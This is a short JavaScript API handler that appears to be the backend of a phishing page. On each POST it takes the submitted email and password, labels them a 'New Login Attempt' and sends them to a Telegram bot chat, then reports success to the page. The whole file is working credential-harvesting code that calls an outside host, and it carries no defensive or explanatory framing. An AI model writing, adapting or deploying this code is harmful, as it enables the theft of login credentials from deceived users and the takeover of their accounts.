export default async function handler(req, res) {
  if (req.method === "POST") {
    const { email, password } = req.body;

    const BOT_TOKEN = process.env.BOT_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    const message = `
New Login Attempt:

Email: ${email}
Password: ${password}
    `;

    await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
        }),
      }
    );

    res.status(200).json({ success: true });
  }
}
